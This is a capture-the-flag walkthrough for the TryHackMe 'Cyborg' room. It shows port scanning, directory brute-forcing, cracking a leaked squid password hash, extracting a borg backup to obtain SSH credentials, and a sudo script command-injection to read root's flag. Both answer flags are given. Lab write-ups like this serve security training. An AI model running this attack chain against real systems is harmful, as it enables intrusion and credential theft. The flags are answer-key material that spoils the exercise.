# Cyborg

{% embed url="https://tryhackme.com/room/cyborgt8" %}
https://tryhackme.com/room/cyborgt8
{% endembed %}

![](../../.gitbook/assets/Cyborg.png)

## Task 2 Compromise the System

#### Scan the machine, how many ports are open?

```bash
rustscan -a 10.10.212.209 -- -n -sVC
```

![](<../../.gitbook/assets/Screenshot from 2022-04-05 08-08-01.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-05 08-08-11.png>)

{% hint style="success" %}
`2`
{% endhint %}

#### What service is running on port 22?

{% hint style="success" %}
`ssh`
{% endhint %}

#### What service is running on port 80?

{% hint style="success" %}
`http`
{% endhint %}

#### What is the user.txt flag?

```bash
gobuster dir -u http://10.10.212.209 \
             -w /usr/share/wordlists/dirb/common.txt \
             -t128
```

![](<../../.gitbook/assets/Screenshot from 2022-04-05 08-12-16.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-05 08-14-32.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-05 08-15-32.png>)

```bash
wget http://10.10.212.209/etc/squid/passwd
john --wordlist=/usr/share/wordlists/rockyou.txt passwd
```

![](<../../.gitbook/assets/Screenshot from 2022-04-05 08-16-06.png>)

```bash
wget http://10.10.212.209/admin/archive.tar
tar xvf archive.tar
cd home/field/dev/final_archive
cat README
```

![](<../../.gitbook/assets/Screenshot from 2022-04-05 08-34-52.png>)

```bash
sudo apt install borgbackup
borg extract --list home/field/dev/final_archive::music_archive
```

![](<../../.gitbook/assets/Screenshot from 2022-04-05 09-23-46.png>)

```bash
cat home/alex/Desktop/secret.txt
cat home/alex/Desktop/note.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-05 09-25-34.png>)

```bash
ssh alex@10.10.212.209
cat root.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-05 09-28-31.png>)

{% hint style="success" %}
`flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`
{% endhint %}

#### What is the root.txt flag?

```bash
sudo -l
ls -l /etc/mp3backups/backup.sh
cat /etc/mp3backups/backup.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-04-05 09-34-18.png>)

```bash
sudo /etc/mp3backups/backup.sh -c 'cat /root/root.txt' 2>/dev/null
```

![](<../../.gitbook/assets/Screenshot from 2022-04-05 09-35-18.png>)

{% hint style="success" %}
`flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`
{% endhint %}

## Reference

{% embed url="https://ostechnix.com/backup-restore-files-borg-linux" %}
